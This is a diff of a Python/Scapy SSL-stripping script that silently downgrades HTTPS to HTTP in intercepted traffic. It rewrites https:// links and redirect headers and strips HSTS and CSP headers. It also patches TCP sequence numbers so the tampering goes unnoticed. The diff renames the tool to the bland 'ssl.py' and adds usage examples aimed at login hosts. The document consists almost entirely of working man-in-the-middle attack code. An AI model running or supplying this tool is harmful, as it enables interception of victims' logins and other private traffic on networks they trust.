@@ -1,9 +1,10 @@
 #!/usr/bin/env python2
 # -*- coding: utf-8 -*-
 """
-sslstrip27.py – “plug-and-play” SSL-stripper for Python-2.7 + Scapy 2.4.x
+ssl.py – “plug-and-play” SSL-stripper for Python-2.7 + Scapy 2.4.x
+Turn every https:// reference in *plaintext* HTTP traffic into http://,
+keeping sequence/ack numbers correct so the TCP streams stay healthy.
 """
-
 from __future__ import print_function, absolute_import
 import argparse, logging, re, signal, sys
 from collections import defaultdict
@@ -13,8 +14,9 @@ from scapy.all import (
     sniff, sendp,
 )
 
+#Centralised logging config – -mv / -q pick level.
 def setup_logging(verbose, quiet):
-    if verbose and quiet:
+    if verbose and quiet: # user passed both → cancel out
         quiet = False
     lvl = logging.DEBUG if verbose else (logging.ERROR if quiet else logging.INFO)
     logging.basicConfig(level=lvl,
@@ -23,44 +25,45 @@ def setup_logging(verbose, quiet):
 
 log = logging.getLogger("sslstrip")
 
-# ────────────────────────── constants / regexes ─────────────────────────────
-HTTPS_RE   = re.compile(br"https://", re.I)
-TAG_RE     = re.compile(br'(?i)(href|src|action)=["\']https://')
-DROP_HDRS  = {b"strict-transport-security", b"content-security-policy"}
-HDR_END_RE = re.compile(br"\r\n\r\n")
-BODY_CAP   = 131072          # 128 kB
+HTTPS_RE= re.compile(br"https://", re.I)# plain “https://”
+TAG_RE = re.compile(br'(?i)(href|src|action)=["\']https://') # HTML attrs
+DROP_HDRS= {b"strict-transport-security", b"content-security-policy"}
+HDR_END_RE = re.compile(br"\r\n\r\n") # header/body split
+BODY_CAP = 131072  # 128 kB
 
-# ─────────────────────────── state tracking ────────────────────────────────
+#per-flow seqence/ack bookkeeping
 class FlowState(object):
+    #track cumulative length delta for a single (src, sport, dst, dport).
     __slots__ = ("c2s_delta", "s2c_delta")
     def __init__(self):
-        self.c2s_delta = 0    # client → server len diff
-        self.s2c_delta = 0    # server → client len diff
-
+        self.c2s_delta = 0 #bytes removed/added client → server len diff
+        self.s2c_delta = 0 #bytes removed/added server → client len diff
+#default-dict returns a new FlowState when first kei is seen
 flows = defaultdict(FlowState)   # (src, sport, dst, dport) → FlowState
 
-# ─────────────────────────── helper functions ──────────────────────────────
+#Strip Accept-Encoding so server answers uncompressed text.
 def _kill_accept_encoding(req):
     out, delta = [], 0
     for line in req.split(b"\r\n"):
         if line.lower().startswith(b"accept-encoding:"):
-            delta -= len(line) + 2
+            delta -= len(line) + 2 #negative delta (bytes removed)
             continue
         out.append(line)
     return b"\r\n".join(out), delta
 
+#Rewrite Location:/Refresh: heads and drop STS / CSP.
 def _rewrite_hdr(resp):
     out, delta = [], 0
     lines = resp.split(b"\r\n")
     for ln in lines:
-        if not ln:           # end of headers
+        if not ln: #blank line → end of header section
             out.append(ln)
             break
         key = ln.split(b":", 1)[0].lower()
-        if key in DROP_HDRS:
+        if key in DROP_HDRS: #drop whole header
             delta -= len(ln) + 2
             continue
-        if key in (b"location", b"refresh"):
+        if key in (b"location", b"refresh"): #downgrade https:// → http://
             nl = HTTPS_RE.sub(b"http://", ln, 1)
             delta += len(nl) - len(ln)
             ln = nl
@@ -68,17 +71,20 @@ def _rewrite_hdr(resp):
     remainder = resp.split(b"\r\n\r\n", 1)[1]
     return b"\r\n".join(out) + b"\r\n\r\n" + remainder, delta
 
+#Replace every https:// and every <a href="https://…"> etc.
 def _rewrite_body(body):
     nb = HTTPS_RE.sub(b"http://", body)
     nb = TAG_RE.sub(lambda m: m.group(1) + b'="http://', nb)
     return nb, len(nb) - len(body)
 
+#Apply running delta so TCP sequence numbers stay in sync.
 def _adjust_tcp(pkt, seq_d, ack_d):
     if seq_d:
         pkt.seq = (pkt.seq + seq_d) & 0xffffffff
     if ack_d:
         pkt.ack = (pkt.ack + ack_d) & 0xffffffff
 
+#Clone original frame, replace payload, let Scapy recalc checksums.
 def _fwd(orig, payload, iface):
     p = orig.copy()
     p[Raw].load = payload
@@ -144,17 +150,17 @@ def main():
     Examples
     --------
     # 1) Strip every HTTPS upgrade that crosses port 80 on iface *enp0s10*
-    sudo python2 sslstrip27.py -i enp0s10 -v
+    sudo python2 ssl.py -i enp0s10 -v
 
     # 2) Only tamper with two specific hosts
-    sudo python2 sslstrip27.py -i enp0s10 --hosts login.corp.local,*.evil.org
+    sudo python2 ssl.py -i enp0s10 --hosts login.corp.local,*.evil.org
 
     # 3) An internal app runs HTTP on 8080 – strip that instead
-    sudo python2 sslstrip27.py -i enp0s10 --bpf "tcp port 8080"
+    sudo python2 ssl.py -i enp0s10 --bpf "tcp port 8080"
     """
 
     ap = argparse.ArgumentParser(
-        prog="sslstrip27.py",
+        prog="ssl.py",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         description="""\
     SSL-stripper for Python 2.7 + Scapy 2.4.x
